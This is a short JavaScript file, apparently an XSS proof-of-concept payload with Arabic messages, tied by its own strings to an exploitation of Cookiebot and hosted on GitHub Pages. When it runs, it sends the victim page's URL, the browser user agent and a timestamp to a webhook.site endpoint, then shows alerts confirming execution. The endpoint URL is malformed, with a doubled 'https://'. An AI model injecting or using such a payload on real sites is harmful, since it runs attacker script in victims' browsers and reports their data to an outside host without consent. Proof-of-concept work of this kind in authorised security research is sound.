console.log("🚨 إرسال عبر Webhook Relay");

fetch("https://https://webhook.site/aa572160-0dad-47bf-a5c0-b663377c4ac6", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    msg: "🚨 Cookiebot تم استغلاله في: " + location.href,
    browser: navigator.userAgent,
    time: new Date().toISOString()
  })
})
.then(() => {
  alert("📬 أُرسل إلى Webhook!");
})
.catch(err => {
  console.error("❌ فشل relay:", err);
  alert("❌ فشل relay");
});

alert("🔥 تم تنفيذ السكربت من GitHub Pages!");
